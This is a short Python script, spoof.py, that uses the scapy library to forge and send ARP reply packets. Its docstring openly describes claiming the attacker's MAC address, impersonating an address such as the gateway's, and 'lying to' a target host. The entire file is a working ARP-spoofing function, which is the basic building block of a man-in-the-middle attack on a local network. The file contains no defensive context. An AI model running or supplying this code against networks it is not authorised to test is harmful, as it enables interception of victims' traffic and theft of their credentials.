#!/usr/bin/env python3
# -.- coding: utf-8 -.-
# spoof.py

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import ARP, Ether, sendp, conf


def sendPacket(src_mac, spoof_ip, target_ip, target_mac, iface=None):
    """
    Send a forged ARP reply.
    src_mac   - MAC to claim as source (attacker's MAC)
    spoof_ip  - IP we're impersonating (e.g. gateway IP)
    target_ip - destination IP (who we're lying to)
    target_mac - destination MAC
    """
    pkt = (
        Ether(src=src_mac, dst=target_mac) /
        ARP(op=2,
            hwsrc=src_mac, psrc=spoof_ip,
            hwdst=target_mac, pdst=target_ip)
    )
    sendp(pkt, verbose=False, iface=iface or conf.iface)
